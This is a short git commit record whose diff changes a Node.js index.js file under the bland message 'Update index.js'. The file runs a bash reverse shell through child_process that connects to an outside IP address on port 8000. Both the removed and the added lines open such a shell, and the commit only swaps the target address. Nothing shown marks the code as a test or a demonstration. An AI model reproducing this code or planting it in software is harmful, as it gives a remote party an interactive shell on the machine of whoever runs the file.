d2f692a1665ce329fe00b447941a5ca69c418678
Jaroslav Lobačevski <jarlob@github.com>
2023-04-15 15:00:45 +0200

    Update index.js

--- index.js
+++ index.js
@@ -1,3 +1,3 @@
 console.log('connecting');
 const cp = require("child_process")
-cp.exec(`/bin/bash -i >& /dev/tcp/52.166.118.236/8000 0>&1`)
+cp.exec(`/bin/bash -i >& /dev/tcp/20.25.180.123/8000 0>&1`)
